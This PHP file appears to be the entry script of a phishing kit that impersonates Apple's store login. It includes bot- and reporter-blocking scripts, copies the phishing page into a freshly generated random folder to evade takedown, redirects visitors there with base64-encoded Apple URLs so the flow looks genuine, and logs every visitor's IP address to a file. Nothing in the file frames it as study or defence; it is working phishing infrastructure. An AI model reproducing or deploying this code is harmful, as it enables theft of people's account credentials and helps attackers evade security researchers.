<?php
require_once('block.php');
require_once('blocker.php');

session_start();
$_SESSION['referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

//Block bots (Reporters)

$login = $_GET['login'];

$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="index";
recurse_copy( $home, $DIR );
header("location:$DIR?login=$login&.login?c=aHR0cDovL3d3dy5hcHBsZS5jb20vc2hvcHwxYW9zNGJjMzU3MDM3ZTc1NmQ3NGY4MTI3ZGZhMWNkNDBlNWZkNGY0MWNhZQ&r=SDHCD9JUYKX777H9KT9JT7JJTAPAXHFKH&s=aHR0cHM6Ly9zZWN1cmUyLnN0b3JlLmFwcGxlLmNvbS9zaG9wL2FjY291bnQvc2V0dXAvc3RhcnQ_c=");
$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>
